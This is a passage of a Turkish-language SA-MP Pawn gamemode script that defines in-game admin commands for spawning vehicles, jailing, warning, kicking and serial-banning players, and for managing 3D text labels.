		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][1], GetPlayerVehicleID(playerid), 0.004999,-2.475000,0.260000,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][2], GetPlayerVehicleID(playerid), 0.004999,-2.475000,0.339999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][3], GetPlayerVehicleID(playerid), 0.005000,-0.029999,0.605000,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][4], GetPlayerVehicleID(playerid), -1.090000,-0.009999,-0.654999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][5], GetPlayerVehicleID(playerid), 1.015000,0.000000,-0.649999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][6], GetPlayerVehicleID(playerid), -1.029999,1.825000,-0.109999,0.000000,0.000000,0.000000);
        AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][7], GetPlayerVehicleID(playerid), -0.779999,-2.245000,-0.424999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][8], GetPlayerVehicleID(playerid), -1.109999,-2.245000,-0.424999,0.000000,0.000000,0.000000);

		AddVehicleComponent(ivehicle[playerid], 1079);
		SetVehicleVirtualWorld(ivehicle[playerid], GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(ivehicle[playerid], GetPlayerInterior(playerid));PutPlayerInVehicle(playerid,ivehicle[playerid],0);
        Araba[playerid] = 1;
        AVehicleData[vID][Fuel] = MaxFuel;
    	}
 		else
			SendClientMessage(playerid, 0x00FF00FF, "Aracta Olmalýsýn.");
		}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}


CMD:godonator(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/godonator", params);

	// Ahýr Sistemi & Animasyonlar
	if(AhirKurban[playerid] != -1) return 0;

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player has a wanted level of less than 3
		if (APlayerData[playerid][PlayerWanted] < 3)
		{
			// Check if the player isn't in jail
			if (APlayerData[playerid][PlayerJailed] == 0)
			{
			    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, -1, "{FF0000}Araçtayken bu komutu kullanamazsýnýz!");
				if (APlayerData[playerid][JobStarted] == false)
				{
					if(IsPlayerInAnyVehicle(playerid))
					{
						SetVehiclePos(GetPlayerVehicleID(playerid), 1039.2250,-1133.5922,23.8203);
					}else{
						SetPlayerPos(playerid,1039.2250,-1133.5922,23.8203);
					}
				}
				else
				{
				    SendClientMessage(playerid, 0xFF0000FF, "Görevdeyken bu komutu kullanamazsýnýz."); // "/rescue" doesn't work during a job
    				SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Görevi iptal etmek istiyorsanýz /goreviptal yazabilirsiniz");
				}
			}
			else
			{
			    SendClientMessage(playerid, 0xFF0000FF, "Hapisteyken bu komutu kullanamazsýnýz");
			}
		}
		else
		{
		    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Aranýyorken bu komutu kullanamazsýnýz");
		    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Eðer oyunda polis yoksa /karakol yazýp karakollardan birinde ceza ödeyin");
		}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}



//label sistemi

CMD:labelolustur(playerid,params[])
{
	if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
 	{
			new Float:x,Float:y,Float:z,string[64],file[128],lebel[999];
		    GetPlayerPos(playerid,x,y,z);
		    for(new i; i < MAX_LABELS; i++)
		    {
		    format(file,sizeof(file),Label_Save,i);
		    if(!fexist(file))
		    {
		    TextLabelID = i;
		    break;
		    }
		    }
			if(unformat(params, "s[128]",params)) return SendSyntaxMessage(playerid, "/labelolustur <yazi>");
		    format(lebel, sizeof(lebel), ""lred"%s\n"lgreen"ID:%d", params, TextLabelID);
		    LabelsInfo[TextLabelID][Label] = CreateDynamic3DTextLabel(lebel, -1, x, y, z, 70.0);
            LabelsInfo[TextLabelID][POSX] = x;
			LabelsInfo[TextLabelID][POSY] = y;
        	LabelsInfo[TextLabelID][POSZ] = z;
   		    format(file,sizeof(file),Label_Save,TextLabelID);
		    dini_Create(file);
            dini_Set(file, "Text", params);
			dini_FloatSet(file, "X", LabelsInfo[TextLabelID][POSX]);
            dini_FloatSet(file, "Y", LabelsInfo[TextLabelID][POSY]);
            dini_FloatSet(file, "Z", LabelsInfo[TextLabelID][POSZ]);
            format(string,sizeof(string),"Label "lyellow2"%i "lgreen"created!", TextLabelID);
			SendClientMessage(playerid,lightgreen,string);
	}
	return 1;
}
CMD:labelsil(playerid,params[])
{
	new lId, file[999];
	if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
 	{
		if(sscanf(params, "d", lId)) return SendSyntaxMessage(playerid, "/labelsil <ID>");
		format(file,sizeof(file),Label_Save,lId);
		if(!dini_Exists(file))
		{
			SendClientMessage(playerid, 0xFF0000FF, ""lred"Label Id Is Not Exist!");
		}
		else if(dini_Exists(file))
		{
			new string[999];
			format(string,sizeof(string),"Label "lyellow2"%i "lgreen"removed!", lId);
			SendClientMessage(playerid,lightgreen,string);
			DestroyDynamic3DTextLabel(LabelsInfo[lId][Label]);
			dini_Remove(file);
		}
	}
	return 1;
}
stock LoadLabels()
{
    for(new i = 0; i < MAX_LABELS;i++)
    {
		new fail[999],lebel[999],labels[999];
        format(fail, sizeof(fail), Label_Save, i);
        if(dini_Exists(fail))
        {
        labels = dini_Get(fail, "Text");
        LabelsInfo[i][POSX] = dini_Float(fail, "X");
        LabelsInfo[i][POSY] = dini_Float(fail, "Y");
        LabelsInfo[i][POSZ] = dini_Float(fail, "Z");
        format(lebel, sizeof(lebel), ""lred"%s\n"lgreen"ID:%d", labels, i);
        LabelsInfo[i][Label] = CreateDynamic3DTextLabel(lebel, -1, LabelsInfo[i][POSX], LabelsInfo[i][POSY], LabelsInfo[i][POSZ], 70.0);
        }
    }
    return 1;
}



// Increases the player's wanted level by 1
CMD:wanted(playerid, params[])
{
	new OtherPlayer, Stars;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/wanted", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 2
		if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
		{
			if (sscanf(params, "ui", OtherPlayer, Stars)) SendSyntaxMessage(playerid, "/label <ID> <Level>");
			else
				if (IsPlayerConnected(OtherPlayer)) // If the player is a valid playerid (he's connected)
					APlayerData[OtherPlayer][PlayerWanted] = Stars;
				else
				    SendClientMessage(playerid, 0xFF0000FF, "That player isn't online");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Lets the player choose a motorcycle to spawn
CMD:bike(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/bike", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			// Make sure the player isn't inside a vehicle
			if (GetPlayerVehicleID(playerid) == 0)
			{
				// Ask which motorcycle the player wants to have
				ShowPlayerDialog(playerid, DialogBike, DIALOG_STYLE_LIST, "Choose a motorcycle:", "Bike\r\nBMX\r\nMountain Bike\r\nFaggio\r\nPizzaboy\r\nBF-400\r\nNRG-500\r\nPCJ-600\r\nFCR-900\r\nFreeway\r\nWayfarer\r\nSanchez\r\nQuad", "Spawn", "Cancel");
				// Let the server know that this was a valid command
				return 1;
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:car(playerid, params[])
{
	SendAdminText(playerid, "/car", params);

	if(APlayerData[playerid][PlayerLevel] < 3 && Root[playerid] == 0) return 0;
	new tmp[128], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/car <Model> <Renk 1> <Renk 2>");

	new model;

	if(IsNumeric(tmp))
	{
 		model = strval(tmp);
	}else{
 		model = GetVehicleModelIDFromName(tmp);
	}

	if(model < 400 || model > 611) return SendClientMessage(playerid, -1, "{FF0000}Belirtilen araç bulunamadý.");

	if(APlayerData[playerid][PlayerLevel] < 5)
	{
	    if(model == 520 || model == 425 || model == 432 || model == 447 || model == 476) return SendClientMessage(playerid, -1, "{FF0000}Bu aracý indirmeye yetkiniz yok!");
	}

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/car <Model> <Renk 1> <Renk 2>");
	new renk1 = strval(tmp);

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/car <Model> <Renk 1> <Renk 2>");
	new renk2 = strval(tmp);

	new Float:oX, Float:oY, Float:oZ, Float:oRot;

	GetPlayerPos(playerid, oX, oY, oZ);
	GetPlayerFacingAngle(playerid, oRot);

	oX = oX + (5.0 * floatcos(oRot + 90, degrees));
	oY = oY + (5.0 * floatsin(oRot + 90, degrees));

	Vehicle_Create(model, oX, oY, oZ, oRot+90, renk1, renk2, -1);

	new Yazi[150];
	format(Yazi, 150, "{00FF00}%s {F8F8FF}adlý aracý spawn ettiniz.", VehNames[model-400]);
	SendClientMessage(playerid, -1, Yazi);
	return 1;
}

// Lets the player choose a car to spawn (in a split list which shows only 10 cars at a time)
CMD:veh(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/veh", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			// Make sure the player isn't inside a vehicle
			if (GetPlayerVehicleID(playerid) == 0)
				CarList_Create(playerid); // Create a list of cars (only the first 10 cars) and show the dialog so the player can choose a car
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}



// Lets the player choose a plane to spawn (in a split list which shows only 10 planes at a time)
CMD:plane(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/plane", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			// Make sure the player isn't inside a vehicle
			if (GetPlayerVehicleID(playerid) == 0)
				PlaneList_Create(playerid); // Create a list of planes (only the first 10 planes) and show the dialog so the player can choose a plane
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}



// Lets the player choose a trailer to spawn (in a split list which shows only 10 trailers at a time)
CMD:trailer(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/trailer", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			// Make sure the player isn't inside a vehicle
			if (GetPlayerVehicleID(playerid) == 0)
				TrailerList_Create(playerid); // Create a list of trailers (only the first 10 trailers) and show the dialog so the player can choose a trailer
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Lets the player choose a boat to spawn
CMD:boat(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/boat", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			// Make sure the player isn't inside a vehicle
			if (GetPlayerVehicleID(playerid) == 0)
			{
				// Ask which motorcycle the player wants to have
				ShowPlayerDialog(playerid, DialogBoat, DIALOG_STYLE_LIST, "Choose a boat:", "Coastguard\nDinghy\nJetmax\nLaunch\nMarquis\nPredator\nReefer\nSpeeder\nSquallo\nTropic", "Spawn", "Cancel");
				// Let the server know that this was a valid command
				return 1;
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}



// Jail a player
CMD:jail(playerid, params[])
{
	new PlayerToJail, JailTime, Reason[128], /*Msg[128],*/ Name[24], AdminName[24];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/jail", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1 || APlayerData[playerid][PlayerRehberLevel] > 2)
		{
			if (sscanf(params, "uis[128]", PlayerToJail, JailTime, Reason)) SendSyntaxMessage(playerid, "/jail <PlayerToJail> <JailTime> <Reason>"); 
			else
				if (IsPlayerConnected(PlayerToJail)) // If the player is a valid playerid (he's connected)
				{
				    if(APlayerData[playerid][PlayerLevel] == 0 && Root[playerid] == 0 && JailTime > 50)return SendClientMessage(playerid, 0xFF0000AA, "Rehberler en fazla 50 saniye hapis atma hakkýna sahiptir!");
				    // Jail the player
					Police_JailPlayer(PlayerToJail, JailTime);
					// Get the name of the player who jailed the player
					GetPlayerName(playerid, AdminName, sizeof(AdminName));
					// Get the name of the player who's being sent to jail
					GetPlayerName(PlayerToJail, Name, sizeof(Name));
					/*
					// Send the jailed player a message who jailed him, why he's been jailed and how long
					format(Msg, 128, "You have been jailed by %s %s for %i seconds", AdminLevelName[APlayerData[playerid][PlayerLevel]], AdminName, JailTime);
					SendClientMessage(PlayerToJail, 0xFF0000FF, Msg);
					format(Msg, 128, "Reason: %s", Reason);
					SendClientMessage(PlayerToJail, 0xFF0000FF, Msg);
					format(Msg, 128, "{00FF00}You have jailed {FFFF00}%s{00FF00} for {FFFF00}%i{00FF00} seconds", Name, JailTime);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					*/
   					new Yazi[256];
   					if(APlayerData[playerid][PlayerLevel] == 0 && Root[playerid] == 0) format(Yazi, 256, "{FF0000}REHBER %s, %s{F8F8FF}'yi %d saniye hapse attý. {FF0000}[ %s ]", GetName(playerid), Name, JailTime, Reason);
					else format(Yazi, 256, "{FF0000}ADMIN %s, %s{F8F8FF}'yi %d saniye hapse attý. {FF0000}[ %s ]", GetName(playerid), Name, JailTime, Reason);
					// Çalýþýr mý?
					SendClientMessageToAll(-1, Yazi);

					new Yazi2[256];
					format(Yazi2, 256, "~r~~h~ADMIN %s, %s~w~'yI %d sanIye hapse attI ~r~~h~( %s )", GetName(playerid), Name, JailTime, Reason);
					SendDuyuruText(Yazi2);
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "That player isn't online");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Warn a player
CMD:uyar(playerid, params[])
{
	new PlayerToWarn, Reason[128], ReasonMsg[128], Name[24];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/uyar", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			if (sscanf(params, "us[128]", PlayerToWarn, Reason)) SendSyntaxMessage(playerid, "/uyar <ID> <Sebep>");
			else
				if (IsPlayerConnected(PlayerToWarn)) // If the player is a valid playerid (he's connected)
				{

                    if(!strcmp("NicqsiZAcent", GetName(PlayerToWarn), true)) return SendClientMessage(playerid, -1, "{FF0000} BAN BAN CIKI CIKI BAN BAN");
                    if(!strcmp("TeaMStar", GetName(PlayerToWarn), true)) return SendClientMessage(playerid, -1, "{FF0000} BAN BAN CIKI CIKI BAN BAN");
					if(!strcmp("Tiger", GetName(PlayerToWarn), true)) return SendClientMessage(playerid, -1, "{FF0000}Kadir Agayi sen kim oluyon da banlýyon ibine!");
					  if(APlayerData[PlayerToWarn][PlayerLevel] >= APlayerData[playerid][PlayerLevel]) return SendClientMessage(playerid, -1, "{FF0000}Kendinizden yüksek levelli yöneticilere bu komutu uygulayamazsiniz!");
					// Increase the number of warnings
					APlayerData[PlayerToWarn][Warnings]++;

					// Get the name of the player who warned the player
					GetPlayerName(playerid, Name, sizeof(Name));
					// Send the warned player a message who warned him and why he's been warned
					format(ReasonMsg, 128, " !! {FFFFFF}SISTEM {FFFFFF} %s tarafýndan  {FF0000}  UYARILDIN !! {FFFFFF} %s Devam Edersen Kickleneceksin.", Name, PlayerToWarn);
					SendClientMessage(PlayerToWarn, 0xFF0000FF, ReasonMsg);
					format(ReasonMsg, 128, "Uyari Sebebi: {FFFFFF} %s", Reason);
					SendClientMessage(PlayerToWarn, 0xFF0000FF, ReasonMsg);
					format(ReasonMsg, 128, "~w~UYARI DURUMUN %i/%i: ~r~%s~w~", APlayerData[PlayerToWarn][Warnings], AutoKickWarnings, Reason);
					GameTextForPlayer(PlayerToWarn, ReasonMsg, 5000, 4);

					// Get the name of the warned player
					GetPlayerName(PlayerToWarn, Name, sizeof(Name));
					// Let the admin know who has been warned and why
					format(ReasonMsg, 128, " %s Adlý Oyuncuyu Uyardýnýz (Uyarý Durumu: %i/%i)", Name, APlayerData[PlayerToWarn][Warnings], AutoKickWarnings);
					SendClientMessage(playerid, 0x00FF00FF, ReasonMsg);
					format(ReasonMsg, 128, "Sebep: %s", Reason);
					SendClientMessage(playerid, 0xFF0000FF, ReasonMsg);

					new Yazi[256];
					format(Yazi, 256, "{FF0000}ADMIN %s, %s{F8F8FF}'yi uyardý. {FF0000}[ %s ][ %i / %i ]", GetName(playerid), Name, Reason, APlayerData[PlayerToWarn][Warnings], AutoKickWarnings);
					SendClientMessageToAll(-1, Yazi);

					new Yazi2[256];
					format(Yazi2, 256, "~r~~h~ADMIN %s, %s~w~'yI uyardI. ~r~~w~( %s )( %i / %i )", GetName(playerid), Name, Reason, APlayerData[PlayerToWarn][Warnings], AutoKickWarnings);
					SendDuyuruText(Yazi2);
					
					format(Yazi, 1000, "%s UyarIldI : Sebep: %s. Warns: (%i / %i)", GetName(PlayerToWarn),  Reason, APlayerData[PlayerToWarn][Warnings], AutoKickWarnings);
					SqlLogYaz(playerid, 3, Yazi);

					// Automatically kick the player if he got 3 warnings (if autokick is enabled)
					if ((APlayerData[PlayerToWarn][Warnings] == AutoKickWarnings) && (AutoKickAfterWarn == 1))
						SafeKick(PlayerToWarn);
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "That player isn't online");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:ssgor(playerid, params[])
{
	new Code[50], Line[128], User;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/ssgor", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", User)) SendSyntaxMessage(playerid, "/ssgor <id>");
			else
				if (IsPlayerConnected(User)) // If the player is a valid playerid (he's connected)
				{
					gpci(User, Code, sizeof(Code));
			        format(Line, sizeof(Line), "User Serial: %s", Code);
			        SendClientMessage(playerid, 0xFFFFFF, Line);
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "That player isn't online");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}


CMD:ssban(playerid, params[])
{
	new id, sebep[76], gseri[56];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/ssban", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", id)) SendSyntaxMessage(playerid, "/ssban <ID>");
			else
				if (IsPlayerConnected(id)) // If the player is a valid playerid (he's connected)
				{
					new string[356],name[MAX_PLAYER_NAME], name2[MAX_PLAYER_NAME];
					GetPlayerName(playerid, name, sizeof name), GetPlayerName(id, name2, sizeof name2);
					gpci(id, gseri, sizeof(gseri));
					format(string, sizeof string, "Yönetici %s oyuncu %s yasakladý. ( Sebep: %s )",name, name2, sebep);
					GetPlayerName(playerid, name, sizeof name);
					format(string, sizeof(string), "/sBan/%s.ini",gseri);
					dini_Create(string);
					dini_IntSet(string, "Tarih", gettime());
					dini_Set(string, "Oyuncu", name2);
					dini_Set(string, "Admin", name);
					dini_Set(string, "Sebep", sebep);
					dini_Set(string, "Serial", gseri);
					format(string, sizeof string, "{ffffff}Hesabýnýz yasaklanmýþ {ffff00}%s{ffffff}, \n\t detaylar:\n\t{ffffff}- Yasaklayan Admin: {ffff00}%s\n\t{ffffff}- Sebep: {ffff00}TROLL \n\t{ffffff}- Banlanan Tarih: {ffff00}%s\n\t{ffffff}", name, name,convertDate(gettime()));
					ShowPlayerDialog(id, DIALOG_BAN, DIALOG_STYLE_MSGBOX, "{ffffff}Üzgünüz, yasaklýsýn!", string, "Kapat", "");
					SetTimerEx("Serial_kick", 50, false, "i", id);
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "That player isn't online");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:unssban(playerid, params[])
{
	new unbann[156], dosya[156];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/unssban", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", unbann)) SendSyntaxMessage(playerid, "/unssban <Serial>");
			else
					format(dosya, sizeof(dosya), "/sBan/%s.ini",unbann);
					if(dini_Exists(dosya)) {
					dini_Remove(dosya);
					format(dosya, sizeof dosya, "Baþarýyla {ffff00}%s {ffffff} baný kaldýrdýnýz.", unbann);
					SendClientMessage(playerid, -1, dosya);
					}else{
					SendClientMessage(playerid, -1, "Böyle bir serial ban bulunamadý!");
					}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

forward Serial_BanKontrol(playerid);public Serial_BanKontrol(playerid){
	new name[MAX_PLAYER_NAME], dosya[156], gseri[56];
	gpci(playerid, gseri, sizeof(gseri));
	GetPlayerName(playerid, name, sizeof name);
	format(dosya, sizeof(dosya), "/sBan/%s.ini",gseri);
	if(dini_Exists(dosya)) {
	SetTimerEx("Serial_kick", 50, false, "i", playerid);
 	}
	return true;
}

stock convertDate(timestamp, _form=0){ // http://forum.sa-mp.com/showthread.php?t=330861
    new year=1970, day=0, month=0, hour=0, mins=0, sec=0;
    new days_of_month[12] = { 31,28,31,30,31,30,31,31,30,31,30,31 };
    new names_of_month[12][10] = {"January","February","March","April","May","June","July","August","September","October","November","December"};
    new returnstring[56];
    while(timestamp>31622400){
        timestamp -= 31536000;
        if ( ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0) ) timestamp -= 86400;
        year++;
    }
    if ( ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0) )
        days_of_month[1] = 29;
    else
        days_of_month[1] = 28;
    while(timestamp>86400){
        timestamp -= 86400, day++;
        if(day==days_of_month[month]) day=0, month++;
    }
    while(timestamp>60){
        timestamp -= 60, mins++;
        if( mins == 60) mins=0, hour++;
    }
    sec=timestamp;
    switch( _form ){
        case 1: format(returnstring, 56, "%02d/%02d/%d %02d:%02d:%02d", day+1, month+1, year, hour, mins, sec);
        case 2: format(returnstring, 56, "%s %02d, %d, %02d:%02d:%02d", names_of_month[month],day+1,year, hour, mins, sec);
        case 3: format(returnstring, 56, "%d %c%c%c %d, %02d:%02d", day+1,names_of_month[month][0],names_of_month[month][1],names_of_month[month][2], year,hour,mins);

        default: format(returnstring, 56, "%02d/%02d/%d %02d:%02d:%02d", day+1, month+1, year, hour, mins, sec);
    }
    return returnstring;
}

forward Serial_kick(playerid);public Serial_kick(playerid){
	return Kick(playerid);
}

// Kicks a player with a reason
CMD:kick(playerid, params[])
{
	new PlayerToKick, Reason[128], ReasonMsg[128], Name[24];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/kick", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			if (sscanf(params, "us[128]", PlayerToKick, Reason)) SendSyntaxMessage(playerid, "/kick <ID> <Sebep>");
			else
				if (IsPlayerConnected(PlayerToKick)) // If the player is a valid playerid (he's connected)
				{
				    if(IsPlayerNPC(PlayerToKick)) return SendClientMessage(playerid, -1, "NPC'yi bu þekilde kickleyemezsin yiðen");
					if(!strcmp("NicqsiZAcent", GetName(PlayerToKick), true)) return SendClientMessage(playerid, -1, "{FF0000} BAN BAN CIKI CIKI BAN BAN");
                    if(!strcmp("NicqsiZAcent", GetName(PlayerToKick), true)) return SendClientMessage(playerid, -1, "{FF0000} BAN BAN CIKI CIKI BAN BAN");
					if(!strcmp("TeaMStar", GetName(PlayerToKick), true)) return SendClientMessage(playerid, -1, "{FF0000}Kadir Agayi sen kim oluyon da banlýyon ibine!");
				    if(APlayerData[PlayerToKick][PlayerLevel] >= APlayerData[playerid][PlayerLevel]) return SendClientMessage(playerid, -1, "{FF0000}Kendinizden yüksek levelli yöneticilere bu komutu uygulayamazsiniz!");
					// Get the name of the player who warned the player
					GetPlayerName(playerid, Name, sizeof(Name));
					// Send the warned player a message who kicked him and why he's been kicked
					format(ReasonMsg, 128, "ADMIN %s tarafýndan atýldýn , %s", AdminLevelName[APlayerData[playerid][PlayerLevel]], Name);
					SendClientMessage(PlayerToKick, 0xFF0000FF, ReasonMsg);
					format(ReasonMsg, 128, "Sebep: %s", Reason);
					SendClientMessage(PlayerToKick, 0xFF0000FF, ReasonMsg);

                    
					format(ReasonMsg, 128, "{F8F8FF}ADMIN {FF0000}%s, %s{F8F8FF}'yi sunucudan attý. [ Sebep: {FF0000}%s {F8F8FF}]", GetName(playerid), GetName(PlayerToKick), Reason);
					SendClientMessageToAll(-1, ReasonMsg);
					new Yazi2[1024];
					format(Yazi2, 1000, "~r~~h~ADMIN %s, %s~w~'yI sunucudan attI. ( Sebep: ~r~%s ~w~)", GetName(playerid), GetName(PlayerToKick), Reason);
					SendDuyuruText(Yazi2);
                    new Yazi[1024];
					format(Yazi, 1000, "%s Sunucudan atýldý: Sebep: %s.", GetName(PlayerToKick), Reason);
					SqlLogYaz(playerid, 2, Yazi);

					format(ReasonMsg, 128, "[KICK] %s(%d), %s(%d)'i sunucudan attý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToKick), PlayerToKick, Reason);
					LOG(ReasonMsg);

					// Kick the player
					SafeKick(PlayerToKick);
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "That player isn't online");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}


CMD:hkick(playerid, params[])
{
	new PlayerToKick, Reason[128], ReasonMsg[128], Name[24];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/hkick", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "us[128]", PlayerToKick, Reason)) SendSyntaxMessage(playerid, "/hkick <ID> <Sebep>");
			else
				if (IsPlayerConnected(PlayerToKick)) // If the player is a valid playerid (he's connected)
				{
				    if(IsPlayerNPC(PlayerToKick)) return SendClientMessage(playerid, -1, "NPC'yi bu þekilde kickleyemezsin yiðen");
					if(!strcmp("TeaMStar", GetName(PlayerToKick), true)) return SendClientMessage(playerid, -1, "{FF0000} BAN BAN CIKI CIKI BAN BAN");
                    if(!strcmp("Tiger", GetName(PlayerToKick), true)) return SendClientMessage(playerid, -1, "{FF0000} BAN BAN CIKI CIKI BAN BAN");
                    if(!strcmp("NicqsiZAcent", GetName(PlayerToKick), true)) return SendClientMessage(playerid, -1, "{FF0000} BAN BAN CIKI CIKI BAN BAN");
					if(APlayerData[PlayerToKick][PlayerLevel] >= APlayerData[playerid][PlayerLevel]) return SendClientMessage(playerid, -1, "{FF0000}Kendinizden yüksek levelli yöneticilere bu komutu uygulayamazsiniz!");
					// Get the name of the player who warned the player
					GetPlayerName(playerid, Name, sizeof(Name));
					// Send the warned player a message who kicked him and why he's been kicked
					format(ReasonMsg, 128, "ADMIN %s tarafýndan atýldýn , %s", AdminLevelName[APlayerData[playerid][PlayerLevel]], Name);
					SendClientMessage(PlayerToKick, 0xFF0000FF, ReasonMsg);
					format(ReasonMsg, 128, "Sebep: %s", Reason);
					SendClientMessage(PlayerToKick, 0xFF0000FF, ReasonMsg);

					format(ReasonMsg, 128, "{F8F8FF}ADMIN {FF0000}%s, %s{F8F8FF}'yi sunucudan attý. [ Sebep: {FF0000}%s {F8F8FF}]", GetName(playerid), GetName(PlayerToKick), Reason);
					SendClientMessageToAll(-1, ReasonMsg);

					format(ReasonMsg, 128, "[KICK] %s(%d), %s(%d)'i sunucudan attý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToKick), PlayerToKick, Reason);
					LOG(ReasonMsg);
					new Yazi[1024];
					format(Yazi, 1000, "%s Sunucudan atýldý [HKICK] : Sebep: %s.", GetName(PlayerToKick),  Reason);
					SqlLogYaz(playerid, 2, Yazi);

					// Kick the player
					SafeKick(PlayerToKick);
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "That player isn't online");
		}
		else
		    return 0;
	}
